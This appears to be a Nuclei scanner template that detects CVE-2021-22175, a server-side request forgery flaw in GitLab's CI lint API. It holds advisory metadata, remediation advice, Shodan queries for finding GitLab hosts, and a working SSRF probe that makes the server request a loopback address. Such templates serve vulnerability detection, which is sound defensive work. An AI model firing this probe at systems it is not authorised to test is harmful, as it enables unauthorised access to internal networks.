id: CVE-2021-22175

info:
  name: GitLab Webhooks Server-Side Request Forgery Vulnerability
  author: CodeStuffBreakThings
  severity: critical
  description: GitLab CE/EE versions 10.5.0 to 13.6.6, 13.7.0 to 13.7.6, and 13.8.0 to 13.8.3 contain a server-side request forgery (SSRF) vulnerability that could be exploited by an unauthenticated attacker to send requests to the internal network. This vulnerability occurs in the webhook functionality of GitLab, even on instances where user registration is disabled, allowing potential unauthorized access to internal services.
  remediation: Upgrade GitLab to a newer version. This vulnerability is patched in 13.6.7, 13.7.7, and 13.8.4. Alternatively, disable the "Allow requests to the local network from webhooks and integrations" setting.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-22175
    - https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22175.json
    - https://gitlab.com/gitlab-org/gitlab/-/issues/294178
    - https://hackerone.com/reports/1059596
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-22175
    cwe-id: CWE-918
    epss-score: 0.00845
    epss-percentile: 0.82644
    cpe: cpe:2.3:a:gitlab:gitlab:::::*:::*
  metadata:
    shodan-query:
      - title:"GitLab"
      - cpe:"cpe:2.3:a:gitlab:gitlab"
  tags: cve2021,cve,gitlab,ssrf

http:
  - raw:
      - |
        POST /api/v4/ci/lint HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        { "include_merged_yaml": true, "content": "include:\n  remote: 'http://127.0.0.1:9100/notarealfilenuclei.yml'" }

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "does not have valid YAML syntax")'
        condition: and
